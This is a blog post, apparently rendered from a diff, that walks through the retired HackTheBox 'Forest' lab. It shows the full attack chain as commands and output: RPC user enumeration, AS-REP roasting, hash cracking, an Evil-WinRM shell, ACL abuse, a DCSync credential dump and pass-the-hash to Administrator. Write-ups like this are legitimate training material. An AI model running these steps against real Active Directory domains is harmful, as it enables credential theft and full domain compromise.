@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html class="direction--ltr"lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox Forest | C:\Users\DcodeZero</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="HackTheBox Forest" />
+<meta name="author" content="jeevan" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="It is a domain controller that allows me to enumerate users over RPC, attack Kerberos with AS-REP Roasting, and use Win-RM to get a shell." />
+<meta property="og:description" content="It is a domain controller that allows me to enumerate users over RPC, attack Kerberos with AS-REP Roasting, and use Win-RM to get a shell." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/retired/2020/04/19/Forest.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/retired/2020/04/19/Forest.html" />
+<meta property="og:site_name" content="C:\Users\DcodeZero" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-04-19T22:09:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox Forest" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"jeevan"},"dateModified":"2020-04-19T22:09:00+05:30","datePublished":"2020-04-19T22:09:00+05:30","description":"It is a domain controller that allows me to enumerate users over RPC, attack Kerberos with AS-REP Roasting, and use Win-RM to get a shell.","headline":"HackTheBox Forest","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/retired/2020/04/19/Forest.html"},"url":"http://localhost:4000/hackthebox/retired/2020/04/19/Forest.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" />
+  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="C:\Users\DcodeZero" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
+  <script src="/assets/js/jquery.magnific-popup.js"></script>
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">C:\Users\DcodeZero<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        
+        
+        <a class="color-red-hover" href="https://dcodezero.github.io/about/"><i class="fab fa-address-card"></i></a>
+        
+        
+        
+        <a class="color-cyan-hover" href="https://twitter.com/Dcodezer0"><i class="fab fa-twitter-square"></i></a>
+        
+        
+        
+        <a class="color-purple-hover" href="https://github.com/DcodeZero"><i class="fab fa-github-square"></i></a>
+        
+        
+        
+        <a class="color-blue-hover" href="codedzero@gmail.com"><i class="fab fa-envelope"></i></a>
+        
+        
+        
+        <a class="color-grey-hover" href="https://app.hackthebox.com/profile/291968"><i class="fab fa-user"></i></a>
+        
+        
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+
+
+<img src="
+    /assets/avatar.png
+" class="author-avatar" alt="Avatar" />
+<div class="description">Hacker || Red Team || PenTester|| CTF Player || Blogger 
+</div>
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">HackTheBox Forest</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/windows/">windows</a>
+      
+      <a class="tag" href="/tag/activedirectory/">activedirectory</a>
+      
+      <a class="tag" href="/tag/impacket/">impacket</a>
+      
+      <a class="tag" href="/tag/evilwinrm/">evilwinrm</a>
+      
+      <a class="tag" href="/tag/bloodhound/">bloodhound</a>
+      
+      <a class="tag" href="/tag/rpcclient/">rpcclient</a>
+      
+  </div>
+  
+  <div class="post-date">
+    Published on 19 Apr 2020
+    
+    by jeevan
+    
+  </div>
+  
+  <noscript>
+    <div class="post-description">It is a domain controller that allows me to enumerate users over RPC, attack Kerberos with AS-REP Roasting, and use Win-RM to get a shell.</div>
+  </noscript>
+  <div id="animated-post-description" class="post-description" style="display: none;"></div>
+  
+  <h2 id="lets-get-started">Let’s get started</h2>
+
+<h3 id="as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:22 EDT
+Warning: 10.10.10.161 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.10.10.161
+Host is up (0.031s latency).
+Not shown: 64742 closed ports, 769 filtered ports
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+49671/tcp open  unknown
+49678/tcp open  unknown
+49697/tcp open  unknown
+49898/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 20.35 seconds
+
+root@kali# nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oA scans/nmap-tcpscripts 10.10.10.161
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:24 EDT
+Nmap scan report for 10.10.10.161
+Host is up (0.030s latency).
+
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2019-10-14 18:32:33Z)
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp open  mc-nmf       .NET Message Framing
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=10/14%Time=5DA4BD82%P=x86_64-pc-linux-gnu%r(DNS
+SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
+SF:\x04bind\0\0\x10\0\x03");
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h27m32s, deviation: 4h02m30s, median: 7m31s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System time: 2019-10-14T11:34:51-07:00
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2019-10-14T18:34:52
+|_  start_date: 2019-10-14T09:52:45
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 281.19 seconds
+
+root@kali# nmap -sU -p- --min-rate 10000 -oA scans/nmap-alludp 10.10.10.161
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:30 EDT
+Warning: 10.10.10.161 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.10.10.161
+Host is up (0.091s latency).
+Not shown: 65457 open|filtered ports, 74 closed ports
+PORT      STATE SERVICE
+123/udp   open  ntp
+389/udp   open  ldap
+58399/udp open  unknown
+58507/udp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 73.74 seconds
+</code></pre></div></div>
+
+<h2 id="finding-users-in-the-domain">Finding Users in the domain</h2>
+
+<p>I used <code>RPCCLIENT</code> to find the users in the domain</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#rpcclient 10.10.10.161 -U%
+rpcclient $&gt; enumdom
+enumdomains    enumdomgroups  enumdomusers   
+rpcclient $&gt; enumdomusers 
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[$331000-VK4ADACQNUCA] rid:[0x463]
+user:[SM_2c8eef0a09b545acb] rid:[0x464]
+user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
+user:[SM_75a538d3025e4db9a] rid:[0x466]
+user:[SM_681f53d4942840e18] rid:[0x467]
+user:[SM_1b41c9286325456bb] rid:[0x468]
+user:[SM_9b69f1b9d2cc45549] rid:[0x469]
+user:[SM_7c96b981967141ebb] rid:[0x46a]
+user:[SM_c75ee099d0a64c91b] rid:[0x46b]
+user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
+user:[HealthMailboxc3d7722] rid:[0x46e]
+user:[HealthMailboxfc9daad] rid:[0x46f]
+user:[HealthMailboxc0a90c9] rid:[0x470]
+user:[HealthMailbox670628e] rid:[0x471]
+user:[HealthMailbox968e74d] rid:[0x472]
+user:[HealthMailbox6ded678] rid:[0x473]
+user:[HealthMailbox83d6781] rid:[0x474]
+user:[HealthMailboxfd87238] rid:[0x475]
+user:[HealthMailboxb01ac64] rid:[0x476]
+user:[HealthMailbox7108a4e] rid:[0x477]
+user:[HealthMailbox0659cc1] rid:[0x478]
+user:[sebastien] rid:[0x479]
+user:[lucinda] rid:[0x47a]
+user:[svc-alfresco] rid:[0x47b]
+user:[andy] rid:[0x47e]
+user:[mark] rid:[0x47f]
+user:[santi] rid:[0x480]
+</code></pre></div></div>
+
+<h2 id="getting-tgt">Getting TGT</h2>
+<p>Getting the <code>TGT</code> from the list of users found from <code>RPCCLIENT</code> using <code>IMPACKET SCRIPTS</code>.</p>
+
+<blockquote>
+  <p>python GetNPUsers.py -no-pass -k -dc-ip 10.10.10.161 htb.local/svc-alfresco</p>
+</blockquote>
+
+<p>There are a bunch of ways to use <code>impacket-scripts</code>, so we can use the below options as well.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Options:
+
+htb.local - is the domain name we extracted from the nmap output
+-usersfile - the list of users we want to test aginst // we extracted from enum4linux output
+-format hashcat - tells the tool to set the hash (if exists) to hashcat format so we crank it easilt
+-outputfile - the place to put the output in
+-dc-ip - the domain controller IP address
+</code></pre></div></div>
+
+<p>we get the hash of the user <code>SVC-alfresco</code></p>
+
+<blockquote>
+  <p>$krb5asrep$23$svc-alfresco@HTB.LOCAL:14c0bc63892470b5a2246ad5456d61f8$11340938cc2f5070bce088816b5a70abb614dcceeaafb99e59788bb288b0b3ad0231b46ec4603d9ebac192028e8d7ac1042cedc80d38c048ba2e8a881f26c0d94d267a52cc59194f4c7b08bef5256198f73e3e9a60c3aa6f92623c12e0b7c4a425edbfbe72561eb97142c8853dea7f532589e7e03d61bbccddaff66bad8d4e1039384ceb364c9d95c1a6828fc9eb232a176f44c44844eed8d9eecf208e22617a46ee61881f9bfda2ab3b67428a43d76798299cda3de9b279b88e8d34e40ab62846252050d6c48870527f1208bf1fb67f17452b0813358c8cefb0df724ce323ba39e212065cbb</p>
+</blockquote>
+
+<h2 id="cracking-the-hash">Cracking the hash</h2>
+
+<p>Now it’s time to crack the hash of the user SVC-alfresco</p>
+
+<blockquote>
+  <p>hashcat -m18200 hash.txt /usr/share/wordlists/rockyou.txt</p>
+</blockquote>
+
+<blockquote>
+  <p>$krb5asrep$23$svc-alfresco@HTB:37a6233a6b2606aa39b55bff58654d5f$87335c1c890ae91dbd9a254a8ae27c06348f19754935f74473e7a41791ae703b95ed09580cc7b3ab80e1037ca98a52f7d6abd8732b2efbd7aae938badc90c5873af05eadf8d5d124a964adfb35d894c0e3b48$5f8a8b31f369d86225d3d53250c63b7220ce699efdda2c7d77598b6286b7ed1086dda0a19a21ef7881ba2b249a022adf9dc846785008408413e71ae008caf00fabbfa872c8657dc3ac82b4148563ca910ae72b8ac30bcea512fb94d78734f38ae7be1b73f8bae0bbfb49e6d61dc9d06d055004d29e7484cf0991953a4936c572df9d92e2ef86b5282877d07c38:<code>s3rvice</code></p>
+</blockquote>
+
+<p>As the password is found, I proceed with using <code>Evil-Winrm</code> to gain the foothold of the machine</p>
+
+<h2 id="getting-usertxt">Getting User.txt</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm -i forest.htb -u svc-alfresco -p s3rvice
+Info: Starting Evil-WinRM shell v1.7
+Info: Establishing connection to remote endpoint                                                         
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt;
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\desktop&gt; type user.txt
+[e*******************************]
+</code></pre></div></div>
+
+<h2 id="privileges-escalation">privileges Escalation</h2>
+
+<h3 id="from-svc-alfresco-to-administrator">From svc-alfresco to Administrator</h3>
+
+<p>Using <code>bloodhound</code> to find some intresting stuff</p>
+
+<p><img src="/assets/img/sample/forest1.png" alt="" /></p>
+
+<p>BloodHound Result Shows Svc-Alfresco can <code>WriteDacl</code> to HTB.local that Contains <code>administrator@htb.local.</code></p>
+
+<h3 id="useful-link-for-priv-esc">Useful link for priv esc</h3>
+
+<blockquote>
+  <p>https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/</p>
+</blockquote>
+
+<p>No it’s time to abuse the AD…</p>
+
+<blockquote>
+  <p>net group “Exchange Windows Permissions” svc-alfresco /add /domain</p>
+</blockquote>
+
+<blockquote>
+  <p>python3 secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</code></pre></div></div>
+
+<p>So as we found the hash of the Administrator of the domain, we can now use <code>Pass the hash</code> to gain the Shell of Administrator.</p>
+
+<h2 id="getting-roottxt">Getting Root.txt</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm -i forest.htb -u Administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+
+Info: Starting Evil-WinRM shell v1.7
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
+htb\administrator
+C:\users\administrator\desktop&gt;type root.txt
+[f*******************************]
+</code></pre></div></div>
+
+<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.<br />
+My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>
+
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'http://localhost:4000/hackthebox/retired/2020/04/19/Forest.html';
+     this.page.identifier = '/hackthebox/retired/2020/04/19/Forest';
+     this.page.title = 'HackTheBox Forest';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//bitbrain-github-io.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/otherposts/2020/10/17/OSCP.html">
+            My  journey  towards  "TRY  HARDER!"
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hackthebox/retired/2020/07/23/Buff.html">
+            HackTheBox Buff
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hackthebox/retired/2020/07/11/Blackfield.html">
+            Hackthebox Blackfiled
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/oscp/" class="set-1">OSCP</a> <a href="/tag/tryharder/" class="set-1">TryHarder</a> <a href="/tag/activedirectory/" class="set-3">activedirectory</a> <a href="/tag/bloodhound/" class="set-1">bloodhound</a> <a href="/tag/bludit/" class="set-1">bludit</a> <a href="/tag/boot2root/" class="set-2">boot2root</a> <a href="/tag/crackmapexec/" class="set-1">crackmapexec</a> <a href="/tag/cve/" class="set-1">cve</a> <a href="/tag/dnspy/" class="set-1">dnspy</a> <a href="/tag/evilwinrm/" class="set-3">evilwinrm</a> <a href="/tag/gobuster/" class="set-4">gobuster</a> <a href="/tag/hashcat/" class="set-2">hashcat</a> <a href="/tag/impacket/" class="set-3">impacket</a> <a href="/tag/john/" class="set-1">john</a> <a href="/tag/ldapsearch/" class="set-1">ldapsearch</a> <a href="/tag/lfi/" class="set-1">lfi</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/lsass/" class="set-1">lsass</a> <a href="/tag/lxd/" class="set-1">lxd</a> <a href="/tag/metasploit/" class="set-2">metasploit</a> <a href="/tag/mimikatz/" class="set-1">mimikatz</a> <a href="/tag/portforwarding/" class="set-1">portforwarding</a> <a href="/tag/rpcclient/" class="set-3">rpcclient</a> <a href="/tag/smb/" class="set-1">smb</a> <a href="/tag/tomcat/" class="set-1">tomcat</a> <a href="/tag/windows/" class="set-5">windows</a> <a href="/tag/wordpress/" class="set-1">wordpress</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = 'It is a domain controller that allows me to enumerate users over RPC, attack Kerberos with AS-REP Roasting, and use Win-RM to get a shell.';
+  const speed = parseInt('70');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+
+  // Image modal
+  var $imgs = [];
+  $('img').each(function(idx) {
+    var obj = {
+      src: $(this).attr('src')
+    }
+    $imgs.push(obj);
+    var elem = $(this);
+    $(this).click(function() {
+      $('.modal').magnificPopup('open', idx);
+    });
+  });
+
+  $('.modal').magnificPopup({
+    items: $imgs,
+    type: 'image',
+    closeOnContentClick: true,
+    mainClass: 'mfp-img-mobile',
+    image: {
+      verticalFit: true
+    }
+    
+  });
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/DcodeZero/dcodezero.github.io">DcodeZero</a> theme for dcodezero by <a href="https://github.com/DcodeZero/dcodezero.github.io">dcodezero</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
